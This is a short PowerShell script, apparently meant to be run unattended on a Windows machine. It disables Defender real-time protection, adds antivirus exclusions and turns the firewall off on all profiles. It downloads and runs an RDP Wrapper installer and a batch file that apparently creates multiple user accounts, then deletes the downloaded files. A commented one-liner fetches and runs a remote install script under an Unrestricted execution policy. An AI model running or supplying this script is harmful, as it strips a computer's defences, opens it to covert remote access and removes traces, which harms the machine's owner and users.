
Set-MpPreference -DisableRealtimeMonitoring 1
netsh advfirewall firewall set rule name="File and Printer Sharing (Echo Request - ICMPv4-In)" dir=in new enable=Yes
Add-MpPreference -ExclusionPath $ENV:USERPROFILE\desktop
NetSh Advfirewall set allprofiles state off
irm https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe -OutFile "$ENV:USERPROFILE\desktop\rdp.exe"
irm https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini -OutFile "$ENV:USERPROFILE\desktop\rdpwrap.ini"
irm https://raw.githubusercontent.com/oldelephent/BAT/main/create_n_numeber_of_user.bat -OutFile "$ENV:USERPROFILE\desktop\user.bat"
start "$ENV:USERPROFILE\desktop\rdp.exe" 
start "$ENV:USERPROFILE\desktop\user.bat"
timeout.exe 20
xcopy /Y "$ENV:USERPROFILE\desktop\rdpwrap.ini" 'C:\Program Files\RDP Wrapper'
Add-MpPreference -ExclusionPath 'C:\Program Files\RDP Wrapper'
Get-Service TermService | Stop-Service -Force
Start-Service TermService
start cmd /C rd /S /Q "%userprofile%"\desktop\rdp.exe "%userprofile%"\desktop\user.bat "%userprofile%"\desktop\rdpwrap.ini "%userprofile%"\desktop\install.ps1

 # irm https://raw.githubusercontent.com/oldelephent/powershell/main/install.ps1 -Outfile "$ENV:USERPROFILE\desktop\install.ps1" Set-ExecutionPolicy Unrestricted -Force ; cd "$env:USERPROFILE\desktop\" ; .\install.ps1 





